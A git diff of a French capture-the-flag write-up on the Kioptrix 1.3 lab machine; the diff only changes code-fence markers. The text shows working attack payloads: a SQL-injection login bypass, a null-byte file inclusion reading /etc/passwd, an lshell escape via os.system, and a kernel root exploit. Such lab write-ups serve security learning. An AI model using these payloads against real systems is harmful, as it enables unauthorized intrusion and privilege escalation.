@@ -8,7 +8,7 @@ Il est tant de boucler les *Kioptrix* existants avec ce [level 1.3](https://www.
 It's Gonna Be Alright
 ---------------------
 
-```plain
+```
 Nmap scan report for 192.168.1.39
 Host is up (0.00021s latency).
 Not shown: 39524 closed ports, 26007 filtered ports
@@ -49,7 +49,7 @@ Host script results:
 
 Sur la page d'index du site se trouve une mire de connexion dont le champ password est vulnérable à une faille SQL :  
 
-```plain
+```
 [*] Lancement du module sql
 ---
 Injection MySQL dans http://192.168.1.39/checklogin.php via une injection dans le paramètre mypassword
@@ -65,14 +65,14 @@ Evil request:
 
 On peut bypasser l'authentification en mettant par exemple l'utilisateur *admin* et *' or 1 #* comme password mais alors on obtient l'erreur suivante :  
 
-```plain
+```
 Oups, something went wrong with your member's page account.
 Please contact your local Administrator to fix the issue.
 ```
 
 Regardons avec sqlmap ce que cette base de données a dans le ventre :  
 
-```plain
+```
 ---
 Parameter: mypassword (POST)
     Type: boolean-based blind
@@ -89,7 +89,7 @@ L'utilisateur utilisé est *root@localhost*, sans mot de passe.
 
 Il y a une table intéressante :  
 
-```plain
+```
 Database: members
 Table: members
 [2 entries]
@@ -105,7 +105,7 @@ Ce qui permet de s'authentifier comme *john* sur l'appli web... mais ça ne nous
 
 Une petite énumération SMB au cas où :  
 
-```plain
+```
 msf auxiliary(smb_enumusers) > show options
 
 Module options (auxiliary/scanner/smb/smb_enumusers):
@@ -130,7 +130,7 @@ Strength To Endure
 
 Il y a un utilisateur *john* comme sur le site qui a bien sûr le même mot de passe :  
 
-```plain
+```
 $  ssh john@192.168.1.39
 john@192.168.1.39's password: 
 Welcome to LigGoat Security Systems - We are Watching
@@ -162,7 +162,7 @@ Connection to 192.168.1.39 closed.
 
 Hmmm drôle de shell. Et il semble que l'on ne puisse pas le bypasser :  
 
-```plain
+```
 $ ssh john@192.168.1.39 -C /bin/bash
 john@192.168.1.39's password: 
 *** forbidden path over SSH: "/bin/bash"
@@ -176,7 +176,7 @@ lost connection
 
 J'ai choisi de retourner sur le site et d'utiliser le module *buster* de *Wapiti* :  
 
-```plain
+```
 [*] Lancement du module buster
 Found webpage http://192.168.1.39/images/
 Found webpage http://192.168.1.39/index
@@ -199,7 +199,7 @@ Si on saisie l'adresse */member.php?username=/etc/passwd* on obtient le message 
 
 Ce qui se confirme avec l'adresse */member.php?username=/etetcc/passwd*  
 
-```plain
+```
 Warning: include(/etc/passwd//etc/passwd.php) [function.include]: failed to open stream: Not a directory in /var/www/member.php on line 14
 
 Warning: include() [function.include]: Failed opening '/etc/passwd//etc/passwd.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/member.php on line 14
@@ -207,7 +207,7 @@ Warning: include() [function.include]: Failed opening '/etc/passwd//etc/passwd.p
 
  Il ne reste plus qu'à se débarrasser du doublon avec */member.php?username=/etetcc/passwd%00* et là bingo:  
 
-```plain
+```
 loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
 john:x:1001:1001:,,,:/home/john:/bin/kshell
 robert:x:1002:1002:,,,:/home/robert:/bin/kshell
@@ -222,7 +222,7 @@ I Won't Let It Happen
 
 Injecter dans les logs ? J'avoue j'ai eu la flemme, je suis retourné fouiller un peu ce shell restreint jusqu'à obtenir une erreur intéressante :  
 
-```plain
+```
 john:~$ cd -h
 lshell: -h: No such file or directory
 ```
@@ -235,7 +235,7 @@ J'ai traîné dans les issues du [Github](https://github.com/ghantoos/lshell/) �
 
 Pas trop grave car il y a [un exploit](https://www.exploit-db.com/exploits/39632/) correspondant au *lshell* du CTF :  
 
-```plain
+```
 $ python 39632.py john MyNameIsJohn 192.168.1.39
 [!] .............................
 [!] lshell <= 0.9.15 remote shell.
@@ -256,7 +256,7 @@ drwxr-xr-x 5 root root 4096 2012-02-04 18:05 ..
 
 Mais l'exploit se montre assez peu utilisable... En cherchant bien il y a une astuce qui s'avère bien plus pratique comme indiquée [ici](http://blog.en.hacker.lk/2012/06/how-i-understood-what-happened-in.html) :  
 
-```plain
+```
 john:~$ echo os.system("/bin/sh")
 $ id
 uid=1001(john) gid=1001(john) groups=1001(john)
@@ -272,7 +272,7 @@ The Crusher
 
 Pour le fun on prend l'identité du système :  
 
-```plain
+```
 No LSB modules are available.
 Distributor ID: Ubuntu
 Description:    Ubuntu 8.04.3 LTS
@@ -284,7 +284,7 @@ Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Lin
 
 Ce qui nous mène à l'exploit *sendpage*, sans doute le chemin qu'il aurait fallut prendre si j'avais persisté sur l'inclusion :  
 
-```plain
+```
 $ ./sendpage
 # id
 uid=0(root) gid=0(root) groups=1001(john)
